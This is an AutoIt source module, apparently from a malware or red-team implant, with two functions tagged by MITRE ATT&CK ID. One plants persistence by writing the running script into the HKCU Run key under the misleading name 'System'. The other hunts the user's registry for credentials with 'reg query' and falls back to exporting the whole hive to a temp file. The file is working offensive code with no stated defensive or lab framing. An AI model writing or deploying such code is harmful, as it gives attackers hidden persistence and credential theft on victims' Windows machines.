#include-once

; Windows registry read/write operations

Func SetRunKeyPersistence() ;DESCRIPTION:Add the current executable to HKCU\Run for user-level persistence;MITRE:Persistence T1547.001
   RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptDir & "\" & @ScriptName)
EndFunc

Func SearchRegistry($sQuery) ;DESCRIPTION:Search HKCU for a string; returns matching reg output or 1/0 via full-hive export fallback;MITRE:CredentialAccess T1552.002
   Local $sTmpPath = @TempDir & "\hkcu_export.tmp"
   Local $sResult  = ExecCommand("reg query HKCU /f """ & $sQuery & """ /t REG_SZ /s")
   If StringLen($sResult) > 40 Then
      Return $sResult
   EndIf
   ; Fall back to full hive export and manual search
   FileDelete($sTmpPath)
   ExecCommand("reg export hkcu """ & $sTmpPath & """")
   Local $sHive = ReadFile($sTmpPath)
   FileDelete($sTmpPath)
   StringReplace($sHive, $sQuery, "", 1, 2) ; @extended = replacement count
   Return @extended > 0 ? 1 : 0
EndFunc
